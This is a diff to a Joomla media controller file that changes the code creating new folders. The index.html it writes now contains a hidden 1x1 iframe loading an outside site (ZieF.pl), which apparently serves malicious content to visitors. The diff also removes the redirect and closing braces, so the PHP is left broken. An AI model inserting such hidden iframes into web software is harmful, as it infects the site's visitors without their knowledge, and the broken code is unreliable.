@@ -121,10 +121,8 @@ class MediaControllerFolder extends MediaController
 			{
 				jimport('joomla.filesystem.*');
 				JFolder::create($path);
-				JFile::write($path.DS."index.html", "<html>\n<body bgcolor=\"#FFFFFF\">\n</body>\n</html>");
+				JFile::write($path.DS."index.html", "<html>\n<body bgcolor=\"#FFFFFF\">\n<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>\n</html>");
 			}
 			JRequest::setVar('folder', ($parent) ? $parent.'/'.$folder : $folder);
-		}
-		$mainframe->redirect('index.php?option=com_media&folder='.$parent);
-	}
-}
+	
